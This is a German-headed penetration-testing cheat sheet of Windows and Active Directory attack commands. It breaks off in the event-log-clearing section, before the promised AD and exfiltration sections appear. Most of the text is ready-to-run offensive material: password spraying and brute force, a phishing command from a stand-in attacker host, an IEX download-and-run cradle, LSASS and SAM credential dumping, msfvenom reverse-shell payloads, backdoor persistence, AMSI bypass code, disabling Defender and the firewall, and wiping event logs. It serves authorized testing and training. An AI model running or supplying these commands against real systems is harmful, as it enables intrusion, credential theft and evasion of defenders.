# Windows & Active Directory Enumeration Methodology
## Autorisierter Penetrationstest Cheat Sheet

**Warnung**: Diese Methoden sind NUR für autorisierte Penetrationstests, CTF-Challenges, Sicherheitsforschung und forensische Analysen auf eigenen/genehmigten Systemen.

**Kontext**: Vollständige Step-by-Step Methodology für Windows Standalone und Active Directory Environments.

---

## Inhaltsverzeichnis

### Phase 1: Initial Reconnaissance
1. [Host Discovery](#1-host-discovery)
2. [Port Scanning](#2-port-scanning)
3. [Service Enumeration](#3-service-enumeration)

### Phase 2: Service-Specific Enumeration
4. [Port 21 - FTP](#port-21---ftp)
5. [Port 22 - SSH](#port-22---ssh)
6. [Port 25/587 - SMTP](#port-25587---smtp)
7. [Port 53 - DNS](#port-53---dns)
8. [Port 80/443 - HTTP/HTTPS](#port-80443---httphttps)
9. [Port 88 - Kerberos](#port-88---kerberos)
10. [Port 110/995 - POP3](#port-110995---pop3)
11. [Port 111 - RPCbind](#port-111---rpcbind)
12. [Port 135 - MSRPC](#port-135---msrpc)
13. [Port 139/445 - SMB](#port-139445---smb)
14. [Port 389/636 - LDAP](#port-389636---ldap)
15. [Port 443 - HTTPS/SSL](#port-443---httpsssl)
16. [Port 1433 - MSSQL](#port-1433---mssql)
17. [Port 3306 - MySQL](#port-3306---mysql)
18. [Port 3389 - RDP](#port-3389---rdp)
19. [Port 5985/5986 - WinRM](#port-59855986---winrm)
20. [Port 5432 - PostgreSQL](#port-5432---postgresql)
21. [Port 8080/8443 - HTTP Alternate](#port-80808443---http-alternate)

### Phase 3: Windows Standalone Methodology
22. [Windows Enumeration Overview](#windows-enumeration-overview)
23. [Credential Access](#credential-access)
24. [Local Privilege Escalation](#local-privilege-escalation)
25. [Persistence Mechanisms](#persistence-mechanisms)
26. [Defense Evasion](#defense-evasion)

### Phase 4: Active Directory Methodology
27. [AD Initial Foothold](#ad-initial-foothold)
28. [AD Domain Enumeration](#ad-domain-enumeration)
29. [User Enumeration](#user-enumeration)
30. [Group Enumeration](#group-enumeration)
31. [Computer Enumeration](#computer-enumeration)
32. [Trust Relationships](#trust-relationships)
33. [GPO Enumeration](#gpo-enumeration)
34. [Credential Harvesting (AD)](#credential-harvesting-ad)
35. [Kerberos Attacks](#kerberos-attacks)
36. [NTLM Attacks](#ntlm-attacks)
37. [ACL Abuse](#acl-abuse)
38. [Delegation Abuse](#delegation-abuse)
39. [Certificate Services Abuse](#certificate-services-abuse)
40. [Domain Dominance](#domain-dominance)

### Phase 5: Post-Exploitation
41. [Data Exfiltration](#data-exfiltration)
42. [Covering Tracks](#covering-tracks)

---

# Phase 1: Initial Reconnaissance

## 1. Host Discovery

### Ping Sweep
```bash
# Nmap Ping Sweep
nmap -sn 192.168.1.0/24 -oA host_discovery

# Aggressive Host Discovery
nmap -PE -PP -PM -PS21,22,23,25,80,113,139,445,3389 -PA80,113,443 -PU 192.168.1.0/24

# NetBIOS Scan (Windows Detection)
nbtscan -r 192.168.1.0/24

# CrackMapExec (AD Environment)
crackmapexec smb 192.168.1.0/24

# ARP Scan (Local Network)
arp-scan -l
netdiscover -r 192.168.1.0/24

# Responder Analysis Mode (Passive)
responder -I eth0 -A
```

### DNS Enumeration
```bash
# Reverse DNS Lookup
nmap -sL 192.168.1.0/24

# DNS Zone Transfer (wenn DNS Server gefunden)
dig axfr @dns-server.local domain.local
host -l domain.local dns-server.local
dnsrecon -d domain.local -t axfr

# DNS Brute Force
dnsrecon -d domain.local -D /usr/share/wordlists/dnsmap.txt -t brt
```

---

## 2. Port Scanning

### Initial Fast Scan
```bash
# Top 1000 Ports (schnell)
nmap -T4 -p- --min-rate=1000 192.168.1.10 -oA fast_scan

# Top Ports
nmap -T4 --top-ports 100 192.168.1.10

# Rustscan (sehr schnell)
rustscan -a 192.168.1.10 -- -sV -sC
```

### Comprehensive Scan
```bash
# Alle TCP Ports
nmap -p- -T4 192.168.1.10 -oA all_tcp_ports

# Service Detection + Scripts
nmap -p <ports> -sV -sC -A -T4 192.168.1.10 -oA detailed_scan

# UDP Scan (langsam, aber wichtig)
sudo nmap -sU --top-ports 20 192.168.1.10 -oA udp_scan

# Aggressive Scan
sudo nmap -p- -A -T4 --script=default,vuln 192.168.1.10 -oA aggressive_scan
```

### Nmap Script Categories
```bash
# Vulnerability Detection
nmap --script vuln -p <ports> 192.168.1.10

# Default Safe Scripts
nmap --script=default -p <ports> 192.168.1.10

# SMB Enumeration Scripts
nmap --script smb-enum-* -p 445 192.168.1.10
nmap --script smb-vuln-* -p 445 192.168.1.10

# HTTP Enumeration
nmap --script http-enum -p 80,443 192.168.1.10

# LDAP Enumeration
nmap --script ldap* -p 389 192.168.1.10
```

---

## 3. Service Enumeration

### Banner Grabbing
```bash
# Netcat
nc -nv 192.168.1.10 21
nc -nv 192.168.1.10 80

# Telnet
telnet 192.168.1.10 25

# Nmap
nmap -sV --version-intensity 9 -p <port> 192.168.1.10
```

### Automated Enumeration
```bash
# AutoRecon (Comprehensive)
autorecon 192.168.1.10

# Enum4linux-ng (Windows/SMB)
enum4linux-ng 192.168.1.10 -A

# ldapdomaindump (AD)
ldapdomaindump -u 'domain\user' -p 'password' 192.168.1.10
```

---

# Phase 2: Service-Specific Enumeration

## Port 21 - FTP

### Enumeration
```bash
# Nmap Scripts
nmap --script ftp-* -p 21 192.168.1.10

# Anonymous Login Test
ftp 192.168.1.10
# User: anonymous
# Pass: anonymous

# Automated
hydra -L users.txt -P passwords.txt ftp://192.168.1.10
```

### Anonymous FTP Check
```bash
# Connect
ftp 192.168.1.10
> anonymous
> anonymous

# Commands
ls -la
get file.txt
mget *
put backdoor.php
```

### FTP Bounce Attack
```bash
nmap -b anonymous:password@192.168.1.10 target_ip
```

---

## Port 22 - SSH

### Enumeration
```bash
# SSH Version
nc -nv 192.168.1.10 22
ssh -V 192.168.1.10

# Nmap Scripts
nmap --script ssh-* -p 22 192.168.1.10

# SSH Audit
ssh-audit 192.168.1.10
```

### Brute Force
```bash
# Hydra
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Medusa
medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M ssh

# CrackMapExec
crackmapexec ssh 192.168.1.10 -u users.txt -p passwords.txt
```

### SSH Key Authentication
```bash
# Find SSH Keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null

# SSH with Key
ssh -i id_rsa user@192.168.1.10

# Crack SSH Key Passphrase
/usr/share/john/ssh2john.py id_rsa > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
```

---

## Port 25/587 - SMTP

### Enumeration
```bash
# Connect
nc -nv 192.168.1.10 25
telnet 192.168.1.10 25

# Commands:
HELO attacker.com
EHLO attacker.com

# User Enumeration via VRFY
VRFY root
VRFY admin

# Nmap Scripts
nmap --script smtp-* -p 25 192.168.1.10

# smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.10
smtp-user-enum -M EXPN -U users.txt -t 192.168.1.10
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.10
```

### Send Email (Phishing)
```bash
# Swaks
swaks --to target@domain.local --from attacker@evil.com --header "Subject: Test" --body "Click here" --server 192.168.1.10
```

---

## Port 53 - DNS

### Zone Transfer
```bash
# dig
dig axfr @192.168.1.10 domain.local

# host
host -l domain.local 192.168.1.10

# dnsrecon
dnsrecon -d domain.local -t axfr -n 192.168.1.10
```

### DNS Enumeration
```bash
# Subdomain Brute Force
dnsrecon -d domain.local -t brt -D /usr/share/wordlists/subdomains.txt

# Reverse Lookup
dnsrecon -d domain.local -t rvl -r 192.168.1.0/24

# dnsenum
dnsenum domain.local --dnsserver 192.168.1.10

# fierce
fierce --domain domain.local --dns-servers 192.168.1.10
```

### DNS Cache Snooping
```bash
nmap --script dns-cache-snoop --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={google.com,facebook.com}' -p 53 192.168.1.10
```

---

## Port 80/443 - HTTP/HTTPS

### Initial Enumeration
```bash
# Whatweb
whatweb http://192.168.1.10

# Nikto
nikto -h http://192.168.1.10

# Nmap Scripts
nmap --script http-enum,http-headers,http-methods,http-webdav-scan -p 80 192.168.1.10
```

### Directory/File Enumeration
```bash
# Gobuster (empfohlen)
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,asp,aspx,jsp

# Dirb
dirb http://192.168.1.10 /usr/share/wordlists/dirb/common.txt

# Feroxbuster (schnell)
feroxbuster -u http://192.168.1.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

# FFUF
ffuf -u http://192.168.1.10/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc all -fc 404
```

### Virtual Host Enumeration
```bash
# Gobuster vhost
gobuster vhost -u http://domain.local -w /usr/share/wordlists/subdomains.txt --append-domain

# FFUF
ffuf -u http://192.168.1.10 -H "Host: FUZZ.domain.local" -w /usr/share/wordlists/subdomains.txt -mc all -fc 301
```

### Web Application Specific
```bash
# WordPress
wpscan --url http://192.168.1.10 --enumerate u,p,t --api-token <token>

# Joomla
joomscan -u http://192.168.1.10

# Drupal
droopescan scan drupal -u http://192.168.1.10

# IIS Specific
# Check for WebDAV
davtest -url http://192.168.1.10

# ShortName Scanner (IIS)
java -jar iis_shortname_scanner.jar http://192.168.1.10
```

### SSL/TLS Enumeration
```bash
# SSLScan
sslscan 192.168.1.10:443

# testssl.sh
testssl.sh https://192.168.1.10

# Nmap SSL Scripts
nmap --script ssl-enum-ciphers,ssl-cert -p 443 192.168.1.10
```

---

## Port 88 - Kerberos

### Enumeration
```bash
# Nmap Scripts
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=/usr/share/wordlists/users.txt 192.168.1.10

# AS-REP Roasting (ohne Credentials)
GetNPUsers.py domain.local/ -dc-ip 192.168.1.10 -usersfile users.txt -format hashcat -outputfile hashes.txt

# Mit Credentials
GetNPUsers.py domain.local/user:password -dc-ip 192.168.1.10 -request
```

---

## Port 110/995 - POP3

### Enumeration
```bash
# Connect
nc -nv 192.168.1.10 110
telnet 192.168.1.10 110

# Commands:
USER username
PASS password
LIST
RETR 1

# Brute Force
hydra -L users.txt -P passwords.txt pop3://192.168.1.10
```

---

## Port 111 - RPCbind

### Enumeration
```bash
# Nmap Scripts
nmap -p 111 --script rpcinfo,nfs-* 192.168.1.10

# RPCinfo
rpcinfo -p 192.168.1.10
```

---

## Port 135 - MSRPC

### Enumeration
```bash
# RPC Endpoint Mapper
rpcdump.py 192.168.1.10

# Impacket rpcmap
rpcmap.py 'ncacn_ip_tcp:192.168.1.10'

# Nmap
nmap -p 135 --script msrpc-enum 192.168.1.10
```

---

## Port 139/445 - SMB

### Initial Enumeration
```bash
# Nmap Scripts (umfassend)
nmap --script smb-protocols,smb-security-mode,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-os-discovery -p 445 192.168.1.10

# Vulnerability Scan
nmap --script smb-vuln-* -p 445 192.168.1.10

# SMBMap (empfohlen)
smbmap -H 192.168.1.10
smbmap -H 192.168.1.10 -u guest
smbmap -H 192.168.1.10 -u '' -p ''

# CrackMapExec
crackmapexec smb 192.168.1.10
crackmapexec smb 192.168.1.10 -u '' -p ''
crackmapexec smb 192.168.1.10 -u guest -p ''

# Enum4linux-ng (Comprehensive)
enum4linux-ng 192.168.1.10 -A
```

### Share Enumeration
```bash
# List Shares
smbclient -L //192.168.1.10 -N
smbclient -L //192.168.1.10 -U guest

# Connect to Share
smbclient //192.168.1.10/SHARENAME -N
smbclient //192.168.1.10/SHARENAME -U username

# Recursive Download
smbget -R smb://192.168.1.10/SHARENAME

# Mount SMB Share (Linux)
mount -t cifs //192.168.1.10/SHARENAME /mnt/smb -o username=user,password=pass

# SMBMap Recursive
smbmap -H 192.168.1.10 -u username -p password -R SHARENAME
```

### User Enumeration
```bash
# Enum4linux
enum4linux -U 192.168.1.10

# RID Cycling
enum4linux -r 192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 --users
crackmapexec smb 192.168.1.10 -u user -p pass --users

# rpcclient
rpcclient -U "" -N 192.168.1.10
> enumdomusers
> queryuser 0x1f4
> enumdomgroups
> querygroupmem 0x200
```

### Password Spraying
```bash
# CrackMapExec
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password123!' --continue-on-success

# With Local Admin Check
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt --local-auth

# Null Session
rpcclient -U "" -N 192.168.1.10
```

### SMB Vulnerabilities
```bash
# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.10

# SMBGhost (CVE-2020-0796)
nmap --script smb-vuln-cve-2020-0796 -p 445 192.168.1.10

# MS08-067
nmap --script smb-vuln-ms08-067 -p 445 192.168.1.10
```

---

## Port 389/636 - LDAP

### Enumeration (Unauthenticated)
```bash
# Nmap Scripts
nmap -p 389 --script ldap-rootdse,ldap-search 192.168.1.10

# ldapsearch (Anonymous)
ldapsearch -x -h 192.168.1.10 -s base namingcontexts
ldapsearch -x -h 192.168.1.10 -b "DC=domain,DC=local"

# Get Domain Info
ldapsearch -x -h 192.168.1.10 -s base '(objectClass=*)' namingContexts
```

### Enumeration (Authenticated)
```bash
# ldapsearch with Credentials
ldapsearch -x -h 192.168.1.10 -D "CN=user,CN=Users,DC=domain,DC=local" -w 'password' -b "DC=domain,DC=local"

# All Users
ldapsearch -x -h 192.168.1.10 -D "CN=user,CN=Users,DC=domain,DC=local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# All Computers
ldapsearch -x -h 192.168.1.10 -D "CN=user,CN=Users,DC=domain,DC=local" -w 'password' -b "DC=domain,DC=local" "(objectClass=computer)"

# Domain Admins
ldapsearch -x -h 192.168.1.10 -D "CN=user,CN=Users,DC=domain,DC=local" -w 'password' -b "DC=domain,DC=local" "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)"

# ldapdomaindump
ldapdomaindump -u 'domain\user' -p 'password' 192.168.1.10 -o ldap_output/
```

### Windapsearch (Recommended)
```bash
# User Enumeration
windapsearch -d domain.local -u user -p password --dc 192.168.1.10 -U

# Computer Enumeration
windapsearch -d domain.local -u user -p password --dc 192.168.1.10 -C

# Domain Admins
windapsearch -d domain.local -u user -p password --dc 192.168.1.10 -m "Domain Admins"

# Privileged Users
windapsearch -d domain.local -u user -p password --dc 192.168.1.10 --admin-objects
```

---

## Port 1433 - MSSQL

### Enumeration
```bash
# Nmap Scripts
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password 192.168.1.10

# Metasploit
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login

# CrackMapExec
crackmapexec mssql 192.168.1.10 -u sa -p password
```

### Connection
```bash
# Impacket mssqlclient.py
mssqlclient.py domain/user:password@192.168.1.10

# With Hash
mssqlclient.py domain/user@192.168.1.10 -hashes :ntlmhash

# sqsh (Linux)
sqsh -S 192.168.1.10 -U sa -P password
```

### SQL Commands
```sql
-- Version
SELECT @@VERSION;

-- Databases
SELECT name FROM master.dbo.sysdatabases;

-- Current User
SELECT SYSTEM_USER;

-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- xp_cmdshell (RCE)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Read Files
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Data;

-- NTLM Relay
EXEC xp_dirtree '\\attacker_ip\share';

-- Linked Servers
SELECT * FROM sys.servers;
EXEC sp_linkedservers;
```

---

## Port 3306 - MySQL

### Enumeration
```bash
# Nmap
nmap -p 3306 --script mysql-* 192.168.1.10

# Connect
mysql -h 192.168.1.10 -u root -p
```

### MySQL Commands
```sql
-- Version
SELECT VERSION();

-- Databases
SHOW DATABASES;

-- Users
SELECT user, host FROM mysql.user;

-- Read File
SELECT LOAD_FILE('/etc/passwd');

-- Write File (if FILE privilege)
SELECT 'backdoor' INTO OUTFILE '/var/www/html/shell.php';

-- UDF for RCE (advanced)
```

---

## Port 3389 - RDP

### Enumeration
```bash
# Nmap Scripts
nmap -p 3389 --script rdp-* 192.168.1.10

# Check if RDP is enabled
nmap -p 3389 --script rdp-enum-encryption 192.168.1.10
```

### Connection
```bash
# xfreerdp
xfreerdp /u:administrator /p:password /v:192.168.1.10
xfreerdp /u:domain\\user /p:password /v:192.168.1.10
xfreerdp /u:user /pth:ntlmhash /v:192.168.1.10

# rdesktop
rdesktop -u administrator -p password 192.168.1.10
```

### Password Spraying
```bash
# CrackMapExec (nicht nativ für RDP, aber über rdp_spray Modul)
# Hydra
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# Crowbar
crowbar -b rdp -s 192.168.1.10/32 -u admin -C passwords.txt
```

### BlueKeep (CVE-2019-0708)
```bash
nmap --script rdp-vuln-ms12-020 -p 3389 192.168.1.10
```

---

## Port 5985/5986 - WinRM

### Enumeration
```bash
# Nmap
nmap -p 5985,5986 --script http-methods,http-title 192.168.1.10

# Test Authentication
crackmapexec winrm 192.168.1.10 -u user -p password
```

### Connection
```bash
# evil-winrm
evil-winrm -i 192.168.1.10 -u administrator -p password
evil-winrm -i 192.168.1.10 -u administrator -H ntlmhash

# PowerShell Remoting (von Windows)
Enter-PSSession -ComputerName 192.168.1.10 -Credential (Get-Credential)
```

---

## Port 5432 - PostgreSQL

### Enumeration
```bash
# Nmap
nmap -p 5432 --script pgsql-brute 192.168.1.10

# Connect
psql -h 192.168.1.10 -U postgres
```

---

## Port 8080/8443 - HTTP Alternate

### Enumeration
```bash
# Same as Port 80/443
whatweb http://192.168.1.10:8080
nikto -h http://192.168.1.10:8080
gobuster dir -u http://192.168.1.10:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Tomcat Specific
# Check for /manager, /host-manager
curl http://192.168.1.10:8080/manager/html

# Default Credentials: tomcat:tomcat, admin:admin
```

---

# Phase 3: Windows Standalone Methodology

## Windows Enumeration Overview

### Initial Access Shell Types
```bash
# Shell Types:
# 1. Non-interactive (web shell, one-liner)
# 2. Basic CMD shell
# 3. PowerShell shell
# 4. Meterpreter
# 5. C2 Beacon (Cobalt Strike, Sliver)

# Upgrade to Better Shell:
# From cmd.exe → PowerShell
powershell.exe -nop -exec bypass

# From basic shell → Meterpreter
# Use web_delivery or upload meterpreter binary
```

### System Information
```cmd
# System Info
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Hostname
hostname

# Environment Variables
set

# Architecture
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

# Hotfixes/Patches
wmic qfe list
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Drivers
driverquery
driverquery /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name','Start Mode',Path
```

### User Enumeration
```cmd
# Current User
whoami
whoami /priv
whoami /groups
whoami /all

# All Local Users
net user
net user /domain

# Specific User Info
net user administrator
net user username

# Local Groups
net localgroup
net localgroup administrators
net localgroup "Remote Desktop Users"

# Domain Groups
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

### Network Information
```cmd
# IP Configuration
ipconfig /all

# Routing Table
route print

# ARP Cache
arp -a

# Active Connections
netstat -ano
netstat -ano | findstr LISTENING
netstat -ano | findstr ESTABLISHED

# Firewall Status
netsh advfirewall show allprofiles
netsh firewall show state
netsh firewall show config

# Network Shares
net share
net view \\127.0.0.1
net view \\hostname /all

# Mapped Drives
net use
wmic logicaldisk get caption,description,providername
```

### Process & Services
```cmd
# Running Processes
tasklist /v
tasklist /svc
wmic process list brief

# Specific Process
tasklist /fi "imagename eq lsass.exe"

# Process with Paths
wmic process get name,executablepath,processid

# Services
net start
sc query
wmic service list brief

# Scheduled Tasks
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "TaskName Task"

# Startup Programs
wmic startup list full
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

### Installed Software
```cmd
# Installed Programs (32-bit)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s

# Installed Programs (64-bit)
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s

# WMIC
wmic product get name,version

# PowerShell
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
```

### File System Search
```cmd
# Interesting Files
dir /s /b C:\*.txt
dir /s /b C:\*.xml
dir /s /b C:\*.config
dir /s /b C:\*.ini
dir /s /b C:\*.log

# Passwords in Files
findstr /si password *.txt *.xml *.config *.ini

# User Files
dir C:\Users\username\Desktop
dir C:\Users\username\Documents
dir C:\Users\username\Downloads

# Recent Files
dir C:\Users\username\AppData\Roaming\Microsoft\Windows\Recent

# Recycle Bin
dir C:\$Recycle.Bin /s
```

---

## Credential Access

### SAM/SYSTEM Dump
```cmd
# Via reg save (requires SYSTEM/Admin)
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
reg save HKLM\SECURITY C:\temp\security.hive

# Copy to Attacker
# Parse with secretsdump.py:
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

### LSASS Dump
```cmd
# comsvcs.dll Method
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full

# Task Manager (GUI)
# Right-click lsass.exe → Create dump file

# ProcDump (Sysinternals)
procdump.exe -ma lsass.exe lsass.dmp

# Parse with Mimikatz:
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

# Parse with pypykatz (Linux):
pypykatz lsa minidump lsass.dmp
```

### Mimikatz (if AV allows)
```cmd
# Sekurlsa Module (Memory)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# LSA Dump
mimikatz.exe "privilege::debug" "lsadump::sam" exit

# Kerberos Tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# DPAPI
mimikatz.exe "sekurlsa::dpapi" exit
```

### Windows Credential Manager
```cmd
# cmdkey
cmdkey /list

# vaultcmd
vaultcmd /listcreds:"Windows Credentials"
vaultcmd /listcreds:"Web Credentials"

# PowerShell
Get-StoredCredential
```

### Registry Credentials
```cmd
# Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# VNC
reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password

# Putty Sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

# SNMP
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities
```

### PowerShell History
```powershell
# PSReadLine History
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# PowerShell Transcripts
dir C:\Users\*\Documents\PowerShell_transcript*.txt /s
```

---

## Local Privilege Escalation

### Automated Enumeration
```powershell
# WinPEAS (empfohlen)
winPEASany.exe
winPEASx64.exe quiet

# PowerUp (PowerSploit)
powershell.exe -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# PrivescCheck
powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/PrivescCheck.ps1'); Invoke-PrivescCheck"

# Seatbelt
Seatbelt.exe -group=all

# SharpUp
SharpUp.exe audit
```

### Common Privilege Escalation Vectors

#### Unquoted Service Paths
```cmd
# Find Unquoted Service Paths
wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerUp
Get-UnquotedService

# Exploit:
# If: C:\Program Files\My Service\service.exe
# Create: C:\Program Files\My.exe or C:\Program.exe
# Restart service
```

#### Weak Service Permissions
```cmd
# Check Service Permissions (accesschk.exe)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Users" *

# PowerUp
Get-ModifiableService

# Exploit:
# If service binary is writable:
sc config VulnService binpath= "C:\temp\reverse.exe"
sc stop VulnService
sc start VulnService
```

#### AlwaysInstallElevated
```cmd
# Check Registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both = 1 → Exploit
# Create MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o reverse.msi

# Install:
msiexec /quiet /qn /i C:\temp\reverse.msi
```

#### Insecure GUI Apps as SYSTEM
```cmd
# If running GUI app as SYSTEM (e.g., via services):
# File → Open → Navigate to C:\Windows\System32\cmd.exe
# Opens CMD as SYSTEM
```

#### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
```cmd
# Check Privileges
whoami /priv

# If SeImpersonatePrivilege = Enabled:
# PrintSpoofer
PrintSpoofer64.exe -i -c cmd

# Juicy Potato (Windows Server 2016/2019)
JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c {CLSID}

# RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd.exe" -l 9999

# GodPotato (Windows Server 2012-2022)
GodPotato.exe -cmd "cmd /c whoami"
```

#### Scheduled Tasks with Weak Permissions
```cmd
# Find Writable Task Files
icacls C:\Scripts\task.bat

# If writable → overwrite with payload
echo C:\temp\reverse.exe > C:\Scripts\task.bat
```

#### DLL Hijacking
```cmd
# Find Missing DLLs
# Use Process Monitor (procmon.exe)
# Look for "NAME NOT FOUND" for DLL loads in writable directories

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f dll -o hijack.dll

# Place in writable directory where app loads DLL
```

#### Kernel Exploits
```cmd
# Check Windows Version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Check for Missing Patches
wmic qfe list

# Exploit Suggester (Local)
# Windows Exploit Suggester (on Kali)
python windows-exploit-suggester.py --database 2024-10-30-mssb.xls --systeminfo systeminfo.txt

# Common Kernel Exploits:
# MS16-032 (Secondary Logon)
# MS16-034 (Win32k)
# MS16-135 (Win32k)
# MS17-010 (EternalBlue)
# CVE-2020-0787
# CVE-2021-1732
# CVE-2021-36934 (HiveNightmare/SeriousSAM)
```

---

## Persistence Mechanisms

### Registry Run Keys
```cmd
# HKLM (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"

# HKCU (current user)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"

# RunOnce
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\temp\backdoor.exe"
```

### Scheduled Tasks
```cmd
# Create Task (runs at logon)
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\backdoor.exe" /sc onlogon /ru System

# Create Task (runs daily)
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\backdoor.exe" /sc daily /st 09:00 /ru System
```

### Services
```cmd
# Create Service
sc create Backdoor binpath= "C:\temp\backdoor.exe" start= auto
sc start Backdoor

# Modify Existing Service
sc config ExistingService binpath= "C:\temp\backdoor.exe"
```

### WMI Event Subscription
```powershell
# Persistent WMI Event (complex but stealthy)
$FilterArgs = @{name='Backdoor'; EventNameSpace='root\CimV2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'}
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{name='Backdoor'; CommandLineTemplate='C:\temp\backdoor.exe'}
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

$FilterToConsumerArgs = @{Filter=$Filter; Consumer=$Consumer}
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

### Startup Folder
```cmd
# User Startup
copy backdoor.exe "C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

# All Users Startup (requires admin)
copy backdoor.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## Defense Evasion

### AMSI Bypass
```powershell
# AMSI Bypass (multiple methods)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

### Windows Defender Exclusions
```powershell
# Add Exclusion (requires admin)
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionExtension "exe"

# Disable Real-Time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Check Exclusions
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Disable Firewall
```cmd
# Disable All Profiles
netsh advfirewall set allprofiles state off

# Specific Profile
netsh advfirewall set currentprofile state off
```

### Clear Event Logs
```cmd
# Clear Security Log
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# PowerShell
